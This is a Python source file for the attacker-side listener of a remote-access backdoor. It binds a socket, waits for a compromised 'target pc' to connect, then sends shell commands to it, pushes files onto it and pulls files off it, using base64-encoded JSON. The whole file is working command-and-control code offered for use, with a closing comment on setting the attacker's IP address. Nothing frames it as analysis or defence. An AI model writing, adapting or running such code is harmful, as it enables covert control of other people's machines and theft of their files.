import socket
import json
import base64
import time


class Listener:
    # creat a connection with attacker
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+]withe for listener")
        self.connection, address = listener.accept()
        print("[+] Connection successful from " + str(address))
        print(self.connection)
# the is fonction for send data to target pc
    def send_safe(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())
# and the is to  recive it
    def safe_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

# to send command
    def send_commands(self, command):
        self.send_safe(command)
        if command[0] == "exit":
            time.sleep(1.5)
            self.connection.close()
            exit()
        return self.safe_receive()
# to write file to upload it to target pc
    def write_file(self, path, content):
        with open(path, "wb") as file :
            file.write(base64.b64decode(content))
            return "[+] Downloads is successful"
# for read 
    def red_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
# for run all fonction past
    def run(self):
       while True:
         command = input(">> ")
         command = command.split()


         if command[0] == "hack":
           file_content = self.red_file(command[1]).decode()
           command.append(file_content)

         result = self.send_commands(command)

         if command[0] == "ara" and "[-] Error" not in result :
           command_result = self.write_file(command[1], result)


         print(result)


my_listener = Listener("192.168.0.123", 80) # change the ip address to your ip address to get your ip address in windows write the is camman in cmd "ipconfig" , in linux write the is cammand in terminal "ifconfig"
my_listener.run()
